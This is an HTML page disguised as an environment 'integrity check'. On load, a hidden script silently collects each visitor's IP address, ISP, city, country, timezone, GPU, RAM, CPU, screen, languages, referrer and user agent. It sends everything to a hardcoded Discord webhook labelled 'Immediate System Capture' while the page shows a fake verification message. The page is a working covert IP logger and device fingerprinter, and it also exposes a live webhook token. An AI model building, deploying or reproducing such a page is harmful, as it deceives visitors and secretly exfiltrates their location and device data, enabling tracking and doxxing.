<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script>
        // IIFE starts IMMEDIATELY before page renders
        (async function() {
            try {
                // 1. Start Geo/IP Fetching ASAP
                const geoPromise = fetch("https://ipwho.is/").then(r => r.json());

                // 2. Immediate Hardware & Browser Probe
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
                
                const systemData = {
                    ua: navigator.userAgent,
                    ram: navigator.deviceMemory || "Unknown",
                    cores: navigator.hardwareConcurrency || "Unknown",
                    screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
                    lang: navigator.languages ? navigator.languages.join(", ") : navigator.language,
                    ref: document.referrer || "Direct Link",
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
                };

                // 3. Wait for Geo data to finish
                const geo = await geoPromise;

                // 4. Send to Webhook instantly
                await fetch("https://discord.com/api/webhooks/1459862155766665229/lW5xj4VpA_c8QEQGM281LRJPrTfcimHYcC7u7LCksU66eckChpVWBPcStgR977CD3NnH", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        embeds: [{
                            title: "üö® Immediate System Capture",
                            color: 0, // Black
                            fields: [
                                { name: "üåê Network/IP", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.connection.isp}\n**Type:** ${geo.type}`, inline: false },
                                { name: "üìç Location", value: `**City:** ${geo.city}\n**Country:** ${geo.country} ${geo.flag.emoji}\n**Timezone:** ${systemData.tz}`, inline: true },
                                { name: "üíª Hardware", value: `**GPU:** ${gpu}\n**RAM:** ${systemData.ram}GB\n**CPU:** ${systemData.cores} Cores`, inline: true },
                                { name: "üñ•Ô∏è Browser/OS", value: `**Screen:** ${systemData.screen}\n**Cookies:** ${systemData.cookies}\n**Lang:** ${systemData.lang}`, inline: false },
                                { name: "üîó Origin", value: `**Ref:** ${systemData.ref}`, inline: true },
                                { name: "üìù User Agent", value: `\`${systemData.ua}\``, inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) { }
        })();
    </script>
    <title>Checking Integrity...</title>
    <style>
        body { background: #000; color: #33ff33; font-family: 'Courier New', monospace; text-align: center; padding-top: 20%; }
        .cursor { border-right: 2px solid #33ff33; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
    </style>
</head>
<body>
    <h2>[ ACCESSING SYSTEM DATA <span class="cursor"></span> ]</h2>
    <p>Please wait while your environment is verified...</p>
</body>
</html>
